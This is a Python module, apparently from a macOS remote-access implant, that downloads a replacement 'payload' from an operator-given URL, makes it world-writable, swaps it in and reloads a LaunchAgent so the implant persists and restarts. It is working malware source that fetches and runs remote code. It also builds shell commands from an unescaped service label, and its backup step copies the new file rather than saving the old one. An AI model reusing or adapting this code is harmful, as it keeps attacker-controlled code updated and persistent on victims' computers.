# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

import os
import shutil
import subprocess
from os import path

try:
    from urllib.request import urlopen, Request, HTTPError
except ImportError:
    from urllib2 import urlopen, Request, HTTPError


BACKUP_FILENAME_SUFFIX = ".bak"


def run_command(command):
    """Runs a system command and returns its output."""
    try:
        out, err = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True
        ).communicate()
        if isinstance(out, bytes):
            out = out.decode("utf-8", errors="replace")
        return (out or "").strip()
    except Exception as ex:
        return str(ex)


def looks_like_payload(data):
    """Cheap sanity check that the downloaded file is actually a payload."""
    probe = data[:512].decode("utf-8", errors="ignore").lstrip()
    if not probe:
        return False
    return probe.startswith("#!") or "def get_uid" in probe or "SERVER_HOST" in probe


def run(options):
    """Swaps the service payload with a freshly downloaded one and restarts it.

    :type options: dict
    """
    response_options = options.get("response_options", {}) or {}
    update_url = response_options.get("update_url", "")
    program_directory = options.get("program_directory", "")
    loader_options = options.get("loader_options", {}) or {}

    if not update_url:
        print("Error: no update_url provided, cannot update.")
        return

    payload_filename = loader_options.get("payload_filename") or "main.py"
    service_label = loader_options.get("service_label", "")

    payload_file = path.join(program_directory, payload_filename)
    backup_file = payload_file + BACKUP_FILENAME_SUFFIX

    if not os.path.isfile(payload_file):
        print("Error: current payload not found at " + payload_file)
        return

    print("Downloading update from " + update_url)
    try:
        response_handle = urlopen(Request(update_url), timeout=30)
        new_payload = response_handle.read()
        response_handle.close()
    except HTTPError as ex:
        print("Error: failed to download update (HTTP " + str(ex.code) + ").")
        return
    except Exception as ex:
        print("Error: failed to download update: " + str(ex))
        return

    if not new_payload or not looks_like_payload(new_payload):
        print("Error: downloaded payload is empty or invalid, aborting.")
        return

    temp_file = payload_file + ".new"
    try:
        with open(temp_file, "wb") as output_file:
            output_file.write(new_payload)
        os.chmod(temp_file, 0o777)
        os.rename(temp_file, payload_file)
        shutil.copyfile(payload_file, backup_file)
    except Exception as ex:
        print("Error: failed to write updated payload: " + str(ex))
        try:
            if os.path.exists(temp_file):
                os.remove(temp_file)
        except OSError:
            pass
        return

    launch_agent_file = path.join(
        path.expanduser("~/Library/LaunchAgents"), service_label + ".plist"
    )

    if service_label and os.path.isfile(launch_agent_file):
        run_command("launchctl stop " + service_label)
        run_command("launchctl unload -w " + launch_agent_file)
        run_command("launchctl bootout gui/$(id -u)/" + service_label)
        run_command("launchctl load -w " + launch_agent_file)
        run_command("launchctl start " + service_label)
        if run_command("launchctl list | grep -w " + service_label):
            print("Updated successfully, service restarted.")
        else:
            print("Payload replaced but service not listed yet.")
    else:
        print("Updated successfully, payload replaced.")
